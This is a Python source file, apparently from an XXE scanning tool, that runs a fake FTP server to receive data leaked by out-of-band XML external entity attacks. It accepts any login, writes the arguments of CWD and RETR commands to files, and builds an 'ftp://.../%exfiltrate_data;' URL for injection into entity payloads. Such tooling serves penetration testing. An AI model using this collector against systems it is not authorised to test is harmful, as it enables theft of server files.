import asyncore
import base
import logging
import os.path
import uuid


class FTPHandler(base.BaseHandler):
    def __init__(self, server, conn, addr):
        base.BaseHandler.__init__(self, server, conn, addr)
        self.outfile = None

        self.set_terminator(b"\r\n")
        self.push(b"220 Welcome!\r\n")

        logging.info("FTP connection from {}".format(self.addr))

    def send_reply(self, reply):
        logging.debug("< {}".format(reply))
        self.push(reply.encode('ascii') + self.get_terminator())

    def found_terminator(self):
        data = b"".join(self.ibuffer)
        self.ibuffer = []
        logging.debug(b"> " + data)

        if data[:4] == b'CWD ' and self.scan_id is None:
            self.scan_id = data[4:]
            self.file_id = str(uuid.uuid4())
            self.outfile = open(
                os.path.join(self.server.output_dir, self.file_id), 'wb')
            self.send_reply("230 Please send more data.")
        elif data[:4] == b'CWD ':
            self.collect_data(data + b'/')
            self.send_reply("230 Please send more data.")
        elif data[:4] == b'EPRT':
            self.send_reply("230 EPRT successful.")
        elif data[:4] == b'EPSV':
            self.send_reply("230 EPSV successful.")
        elif data[:4] == b'LIST':
            self.send_reply(
                "drwxrwxrwx 1 root root          1 Jan 01 13:37 xxe")
            self.send_reply("150 Opening BINARY data mode connection for /xxe")
            self.send_reply("226 Transfer complete.")
        elif data[:4] == b'USER':
            self.send_reply("331 Password required.")
        elif data[:4] == b'PASS':
            self.send_reply("230 Password accepted.")
        elif data[:4] == b'PORT':
            self.send_reply("200 PORT successful.")
        elif data[:4] == b'QUIT':
            self.send_reply("221 Goodbye.")
            self.close_when_done()
        elif data[:4] == b'RETR':
            self.collect_data(data)
            self.send_reply("231 Thank you. Please come again.")
            self.close_when_done()
        elif data[:4] == b'TYPE':
            self.send_reply("200 TYPE successful.")
        else:
            self.send_reply("500 Invalid command; please be more creative.")

    def collect_data(self, data):
        sdata = data.split(b' ', 1)
        if len(sdata) > 1 and self.outfile is not None:
            self.outfile.write(sdata[1])

    def handle_close(self):
        base.BaseHandler.handle_close(self)

        if self.outfile is not None:
            self.outfile.close()


class FTPCollector(base.BaseCollector):
    def get_exfil_url(self, scan_id):
        return "ftp://{0}:{1}/{2}/%exfiltrate_data;".format(
            self.addr[0], self.addr[1], scan_id)

    def run(self):
        base.BaseServer(self.addr, FTPHandler, self.output_dir, self.queue)
        asyncore.loop()
